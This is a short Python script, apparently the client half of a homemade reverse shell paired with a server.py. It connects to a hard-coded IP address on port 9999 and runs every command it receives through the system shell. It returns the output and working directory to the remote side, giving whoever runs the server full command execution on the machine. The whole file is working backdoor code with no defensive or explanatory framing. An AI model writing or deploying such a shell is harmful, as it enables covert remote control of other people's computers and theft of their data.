import os
import socket
import subprocess

s = socket.socket()
host = "192.168.43.12" # my pc's IP address
port = 9999 # same as in server.py

s.connect((host,port)) # socket will connect the server 

while True:

    data = (s.recv(1024).decode('utf-8')) # s.recv - comment from server(in bits) but we need as string in client.py file

    if data[:2] == 'cd': 
        os.chdir(data[3:])

    if len(data) > 0:

        cmd = subprocess.Popen(data[:], shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE) 
        #execute the servers comment in cmd and store it in cmd

        output_bytes = cmd.stdout.read() + cmd.stderr.read() 

        output_str = output_bytes.decode("utf-8")

        s.send(str.encode(output_str+str(os.getcwd() ) + ">"))


s.close()




